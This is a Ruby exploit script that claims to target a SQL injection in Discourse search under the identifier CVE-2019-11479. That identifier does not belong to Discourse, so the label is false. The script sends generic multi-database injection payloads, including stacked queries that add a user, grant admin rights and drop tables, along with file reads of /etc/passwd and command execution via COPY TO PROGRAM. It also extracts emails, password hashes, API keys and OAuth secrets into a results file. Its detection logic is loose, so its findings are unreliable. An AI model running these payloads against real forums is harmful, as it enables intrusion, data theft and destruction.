#!/usr/bin/env ruby

# CVE-2019-11479: Discourse SQL Injection Vulnerability
# Severity: Critical
# CVSS: 9.8
#
# Description:
# Critical SQL injection vulnerability in Discourse search functionality
# allowing attackers to extract sensitive data from the database.
#
# Affected Versions:
# - Discourse < 2.3.0.beta4
# - Discourse < 2.2.4
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'time'

class CVE_2019_11479
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @results = {
      cve: 'CVE-2019-11479',
      vulnerable: false,
      severity: 'Critical',
      cvss: 9.8,
      details: [],
      payloads: [],
      extracted_data: []
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2019-11479 against #{@target_url}"
    puts "[*] Severity: Critical (CVSS: 9.8)"
    puts "[*] Description: SQL Injection in Discourse Search"
    puts "-" * 60

    # Get CSRF token
    get_csrf_token

    # Test SQL injection
    puts "[*] Testing SQL injection in search functionality..."
    test_search_sqli

    # Test advanced SQL injection techniques
    puts "[*] Testing advanced SQL injection techniques..."
    test_advanced_sqli

    # Test data extraction
    puts "[*] Testing data extraction..."
    test_data_extraction

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def test_search_sqli
    # SQL injection payloads for search
    sqli_payloads = [
      # Basic injection tests
      "' OR 1=1--",
      "' OR '1'='1",
      "' OR 1=1#",
      "' OR 1=1/*",
      "\" OR 1=1--",
      "\" OR \"1\"=\"1",
      
      # Union-based injection
      "' UNION SELECT 1,2,3,4,5--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT version(),user(),database(),@@version,@@datadir--",
      "' UNION SELECT table_name,column_name,1,2,3 FROM information_schema.columns--",
      
      # Time-based blind injection
      "' OR (SELECT SLEEP(5))--",
      "' OR (SELECT pg_sleep(5))--",
      "' OR (SELECT COUNT(*) FROM pg_stat_activity WHERE pg_sleep(5) IS NOT NULL)--",
      "'; WAITFOR DELAY '00:00:05'--",
      
      # Boolean-based blind injection
      "' AND (SELECT SUBSTRING(version(),1,1))='P'--",
      "' AND (SELECT COUNT(*) FROM users)>0--",
      "' AND (SELECT LENGTH(current_database()))>0--",
      
      # Error-based injection
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND CAST((SELECT version()) AS INT)--",
      
      # PostgreSQL specific
      "' AND (SELECT * FROM generate_series(1,1000000))--",
      "' UNION SELECT NULL,NULL,NULL,NULL,current_database()--",
      "' UNION SELECT NULL,NULL,NULL,NULL,current_user--",
      "' UNION SELECT NULL,NULL,NULL,NULL,inet_server_addr()--",
      
      # Advanced techniques
      "' OR 1=CAST((SELECT COUNT(*) FROM users) AS VARCHAR)--",
      "' OR 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--",
      "' UNION SELECT NULL,NULL,NULL,NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)--"
    ]

    sqli_payloads.each do |payload|
      test_search_payload(payload)
      sleep(0.5) # Rate limiting
    end
  end

  def test_search_payload(payload)
    begin
      # Test search endpoint
      search_url = "#{@target_url}/search"
      params = {
        'q' => payload,
        'type' => 'topic',
        'context' => 'topic'
      }
      
      uri = URI(search_url)
      uri.query = URI.encode_www_form(params)
      
      start_time = Time.now
      response = make_request(uri, 'GET', nil, {
        'X-CSRF-Token' => @csrf_token,
        'X-Requested-With' => 'XMLHttpRequest'
      })
      response_time = Time.now - start_time
      
      if response && check_sqli_success(response, payload, response_time)
        @results[:vulnerable] = true
        @results[:details] << "SQL injection via search: #{payload}"
        @results[:payloads] << payload
        
        # Extract data if possible
        extracted = extract_sqli_data(response, payload)
        @results[:extracted_data].concat(extracted) if extracted
        
        puts "[+] SQL injection successful: #{payload[0..50]}..."
      end
      
    rescue => e
      @results[:details] << "Error testing SQL payload: #{e.message}"
    end
  end

  def test_advanced_sqli
    # Advanced SQL injection techniques
    advanced_payloads = [
      # Stacked queries
      "'; INSERT INTO users (username, email) VALUES ('hacker', 'hacker@evil.com')--",
      "'; UPDATE users SET admin = true WHERE username = 'admin'--",
      "'; DROP TABLE IF EXISTS temp_table--",
      
      # File operations (MySQL)
      "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/tmp/sqli_test.txt'--",
      
      # PostgreSQL file operations
      "' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--",
      "' UNION SELECT pg_ls_dir('.'),NULL,NULL,NULL,NULL--",
      
      # Command execution (PostgreSQL)
      "'; COPY (SELECT '') TO PROGRAM 'id'--",
      "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT--",
      
      # Database enumeration
      "' UNION SELECT table_name,column_name,data_type,is_nullable,column_default FROM information_schema.columns WHERE table_schema=current_database()--",
      "' UNION SELECT schemaname,tablename,tableowner,tablespace,hasindexes FROM pg_tables--",
      
      # User enumeration
      "' UNION SELECT username,email,created_at,admin,moderator FROM users--",
      "' UNION SELECT name,value,NULL,NULL,NULL FROM site_settings--",
      
      # API key extraction
      "' UNION SELECT key,user_id,created_at,revoked_at,description FROM api_keys--",
      "' UNION SELECT client_id,client_secret,redirect_uri,scopes,NULL FROM oauth_applications--"
    ]

    advanced_payloads.each do |payload|
      test_advanced_payload(payload)
      sleep(1) # Longer delay for advanced payloads
    end
  end

  def test_advanced_payload(payload)
    begin
      # Test multiple endpoints
      endpoints = ['/search', '/search/query', '/admin/search_logs']
      
      endpoints.each do |endpoint|
        next unless endpoint_accessible?(endpoint)
        
        url = "#{@target_url}#{endpoint}"
        params = { 'q' => payload }
        
        response = make_post_request(url, params)
        
        if response && check_advanced_sqli(response, payload)
          @results[:vulnerable] = true
          @results[:details] << "Advanced SQL injection via #{endpoint}: #{payload[0..50]}..."
          @results[:payloads] << payload
          
          puts "[+] Advanced SQL injection successful: #{endpoint}"
        end
      end
      
    rescue => e
      @results[:details] << "Error testing advanced payload: #{e.message}"
    end
  end

  def test_data_extraction
    return unless @results[:vulnerable]
    
    # Data extraction payloads
    extraction_payloads = [
      # Extract users
      "' UNION SELECT username,email,CAST(admin AS VARCHAR),CAST(moderator AS VARCHAR),created_at FROM users LIMIT 10--",
      
      # Extract site settings
      "' UNION SELECT name,value,'setting','','NOW()' FROM site_settings WHERE name LIKE '%secret%' OR name LIKE '%key%'--",
      
      # Extract API keys
      "' UNION SELECT CAST(user_id AS VARCHAR),key,description,CAST(created_at AS VARCHAR),CAST(revoked_at AS VARCHAR) FROM api_keys--",
      
      # Extract OAuth applications
      "' UNION SELECT name,client_id,client_secret,redirect_uri,scopes FROM oauth_applications--",
      
      # Extract database version and config
      "' UNION SELECT version(),current_database(),current_user,inet_server_addr(),CAST(inet_server_port() AS VARCHAR)--",
      
      # Extract file system info
      "' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--",
      "' UNION SELECT pg_read_file('/proc/version'),NULL,NULL,NULL,NULL--"
    ]

    extraction_payloads.each do |payload|
      extract_with_payload(payload)
      sleep(1)
    end
  end

  def extract_with_payload(payload)
    begin
      search_url = "#{@target_url}/search"
      params = { 'q' => payload }
      
      uri = URI(search_url)
      uri.query = URI.encode_www_form(params)
      
      response = make_request(uri, 'GET', nil, {
        'X-CSRF-Token' => @csrf_token
      })
      
      if response
        extracted = extract_sensitive_data(response.body)
        if extracted && !extracted.empty?
          @results[:extracted_data].concat(extracted)
          puts "[+] Data extracted: #{extracted.length} items"
        end
      end
      
    rescue => e
      puts "[!] Error extracting data: #{e.message}"
    end
  end

  def check_sqli_success(response, payload, response_time)
    return false unless response
    
    content = response.body.downcase
    
    # SQL error indicators
    sql_errors = [
      'syntax error', 'mysql_fetch', 'ora-01756', 'microsoft ole db',
      'postgresql', 'warning: mysql', 'valid mysql result', 'mysqlclient',
      'postgresql query failed', 'pg_query', 'pg_exec', 'pg_fetch',
      'column count doesn\'t match', 'operand should contain 1 column',
      'the used select statements have different number of columns',
      'table doesn\'t exist', 'unknown column', 'ambiguous column name',
      'invalid column name', 'must declare the scalar variable',
      'unclosed quotation mark', 'quoted string not properly terminated'
    ]
    
    # Check for SQL errors
    sql_errors.each do |error|
      return true if content.include?(error)
    end
    
    # Check for time-based injection
    if payload.include?('sleep') || payload.include?('waitfor')
      return true if response_time > 4
    end
    
    # Check for union injection success
    if payload.include?('union')
      union_indicators = ['version()', 'user()', 'database()', '@@version']
      union_indicators.each do |indicator|
        return true if content.include?(indicator.downcase)
      end
    end
    
    # Check response status
    return true if response.code.to_i == 500
    
    false
  end

  def check_advanced_sqli(response, payload)
    return false unless response
    
    content = response.body.downcase
    
    # Advanced injection indicators
    advanced_indicators = [
      'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd content
      'postgresql', 'mysql', 'version',     # Database info
      'admin', 'moderator', 'api_key',      # Discourse specific
      'client_secret', 'oauth',             # OAuth info
      'site_setting', 'configuration'       # Config info
    ]
    
    advanced_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Check for successful data extraction
    if payload.include?('information_schema') || payload.include?('pg_tables')
      return true if content.include?('table_name') || content.include?('column_name')
    end
    
    false
  end

  def extract_sqli_data(response, payload)
    return [] unless response
    
    extracted = []
    content = response.body
    
    # Extract database version
    version_match = content.match(/PostgreSQL\s+([\d\.]+)/i)
    extracted << "Database version: #{version_match[1]}" if version_match
    
    # Extract user information
    email_matches = content.scan(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/)
    email_matches.each { |email| extracted << "Email found: #{email}" }
    
    # Extract API keys
    api_key_matches = content.scan(/[a-f0-9]{32,64}/)
    api_key_matches.each { |key| extracted << "Potential API key: #{key}" }
    
    extracted
  end

  def extract_sensitive_data(content)
    extracted = []
    
    # Extract emails
    emails = content.scan(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/)
    emails.each { |email| extracted << "Email: #{email}" }
    
    # Extract potential passwords/hashes
    hashes = content.scan(/\$2[aby]\$[0-9]{2}\$[A-Za-z0-9.\/]{53}/)
    hashes.each { |hash| extracted << "Password hash: #{hash}" }
    
    # Extract API keys
    api_keys = content.scan(/[a-f0-9]{32,64}/)
    api_keys.each { |key| extracted << "API key: #{key}" }
    
    # Extract usernames
    usernames = content.scan(/"username"\s*:\s*"([^"]+)"/)
    usernames.each { |username| extracted << "Username: #{username[0]}" }
    
    extracted.uniq
  end

  def endpoint_accessible?(endpoint)
    begin
      uri = URI("#{@target_url}#{endpoint}")
      response = make_request(uri)
      return response && response.code.to_i != 404
    rescue
      return false
    end
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    # Set up proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    # Set headers
    request['User-Agent'] = @user_agent
    request['Accept'] = 'application/json, text/javascript, */*; q=0.01'
    request['Accept-Language'] = 'en-US,en;q=0.9'
    
    # Add session cookies
    if !@session_cookies.empty?
      cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      request['Cookie'] = cookie_string
    end
    
    # Add custom headers
    headers.each { |k, v| request[k] = v }
    
    # Set body for POST requests
    if body && method.upcase == 'POST'
      request.body = body
      request['Content-Type'] = 'application/x-www-form-urlencoded'
    end
    
    begin
      response = http.request(request)
      
      # Update session cookies
      response.get_fields('set-cookie')&.each do |cookie|
        cookie_parts = cookie.split(';')[0].split('=')
        @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
      end
      
      response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      nil
    end
  end

  def make_post_request(url, params)
    uri = URI(url)
    body = URI.encode_www_form(params)
    
    make_request(uri, 'POST', body, {
      'X-CSRF-Token' => @csrf_token,
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2019-11479 EXPLOIT SUMMARY"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Payloads tested: #{@results[:payloads].length}"
    
    if @results[:extracted_data].any?
      puts "\nExtracted Data:"
      @results[:extracted_data].each { |data| puts "  - #{data}" }
    end
    
    if @results[:details].any?
      puts "\nDetails:"
      @results[:details].each { |detail| puts "  - #{detail}" }
    end
  end

  def save_results
    filename = 'CVE-2019-11479_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "CVE-2019-11479: Discourse SQL Injection Exploit\n\n"
    opts.banner += "CVE-2019-11479 Details:\n"
    opts.banner += "  Severity: Critical (CVSS: 9.8)\n"
    opts.banner += "  Description: SQL injection in Discourse search functionality\n"
    opts.banner += "  Affected: Discourse < 2.3.0.beta4, < 2.2.4\n\n"
    opts.banner += "Usage: ruby CVE-2019-11479.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-v', '--verbose', 'Verbose output') do
      options[:verbose] = true
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby CVE-2019-11479.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = CVE_2019_11479.new(target_url, options)
    results = exploit.run_exploit
    
    if results[:vulnerable]
      puts "\n🚨 CRITICAL: Target is vulnerable to CVE-2019-11479!"
      puts "   SQL injection possible in search functionality!"
      puts "   Database access and data extraction possible!"
    else
      puts "\n✅ Target appears to be patched against CVE-2019-11479"
    end
    
  rescue Interrupt
    puts "\n[!] Exploit interrupted by user"
  rescue => e
    puts "\n[!] Exploit failed: #{e.message}"
  end
end